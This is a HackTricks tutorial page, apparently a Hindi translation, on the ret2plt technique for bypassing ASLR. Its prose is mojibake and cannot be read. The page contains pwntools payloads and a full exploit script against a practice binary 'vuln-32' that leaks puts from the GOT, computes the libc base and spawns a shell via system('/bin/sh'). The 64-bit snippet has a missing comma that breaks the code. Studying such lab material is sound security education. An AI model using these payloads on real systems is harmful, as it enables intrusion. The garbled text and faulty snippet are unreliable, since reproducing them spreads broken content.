# Ret2plt

{% hint style="success" %}
**AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:** [**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)\
**GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:** [**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рд▓рдХреНрд╖реНрдп рд╣реЛрдЧрд╛ рдХрд┐ **PLT рд╕реЗ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ** рддрд╛рдХрд┐ ASLR рдХреЛ рдЙрдореНрдореАрдж рд╕реЗ рднреА рдЖрдЧреЗ рдмрдврд╝рд╛ рд╕рдХреЗрдВред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЖрдк, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `puts` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд░рддреЗ рд╣реИрдВ libc рд╕реЗ, рддреЛ рдлрд┐рд░ рдЖрдк **`libc` рдХрд╛ рдмреЗрд╕ рдХрд╣рд╛рдБ рд╣реИ рдЙрд╕реЗ рдЧрдгрдирд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдСрдлрд╝рд╕реЗрдЯ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ **`system`**ред

рдпрд╣ `pwntools` рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ ([**рдпрд╣рд╛рдБ рд╕реЗ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **`puts`** (PLT рд╕реЗ рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) `puts` рдХрд╛ рдкрддрд╛ рдЧреЛрдЯ (рдЧреНрд▓реЛрдмрд▓ рдСрдлрд╕реЗрдЯ рдЯреЗрдмрд▓) рдореЗрдВ рд╕реНрдерд┐рдд `puts` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `puts` рдЬрдм `puts` рдХрд╛ GOT рдПрдВрдЯреНрд░реА рдкреНрд░рд┐рдВрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдПрдВрдЯреНрд░реА рдореЗрдореЛрд░реА рдореЗрдВ `puts` рдХрд╛ рд╕рдЯреАрдХ рдкрддрд╛** рд░рдЦреЗрдЧреАред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ `main` рдХрд╛ рдкрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ `puts` рдЕрдкрдиреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдиреЗ рдкрд░ **рдмрд╛рдЗрдирд░реА `main` рдХреЛ рдлрд┐рд░ рд╕реЗ рдмреБрд▓рд╛рдП** (рддрд╛рдХрд┐ рд▓реАрдХ рд╣реБрдЖ рдкрддрд╛ рд╡реИрдз рд░рд╣реЗ)ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрд╛рдЗрдирд░реА рдХреЛ PIE рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдпрд╛ рдЖрдкрдХреЛ **PIE рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реАрдХ рдкрд╛рдирд╛ рд╣реЛрдЧрд╛** рддрд╛рдХрд┐ PLT, GOT рдФрд░ main рдХрд╛ рдкрддрд╛ рдкрддрд╛ рдЪрд▓реЗред рдЕрдиреНрдпрдерд╛, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ PIE рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

рдЖрдк рдпрд╣рд╛рдБ [**рдЗрд╕ рдмрд╛рдЗрдкрд╛рд╕ рдХрд╛ рдкреВрд░реНрдг рдЙрджрд╛рд╣рд░рдг рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)ред рдпрд╣ рдЙрд╕ **рдЙрджрд╛рд╣рд░рдг** рдХрд╛ рдЕрдВрддрд┐рдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдерд╛ред
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди PIE рдирд╣реАрдВ рд╣реИ, рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ рдХрд┐ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рднрд░рдирд╛ рд╣реИ рдЬрдм рддрдХ рдХреИрдиреЗрд░реА рдХрд╛ рдмрд╛рдЗрдЯ 0x00 рддрдХ рди рдкрд╣реБрдВрдЪ рдЬрд╛рдП рдФрд░ рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рд▓реАрдХ рдХрд░реЗрдВред рдХреИрдиреЗрд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рдЧреИрдЬреЗрдЯред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ рд╣реИ, рдореБрдЦреНрдп рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдореЗрдВ рдПрдХ рдЪрд╛рдЗрд▓реНрдб рдлрд╝рдВрдХреНрд╢рди рд╕реЗред puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рддрд╛рдХрд┐ GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рд╣реЛ рдФрд░ рдлрд┐рд░ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред
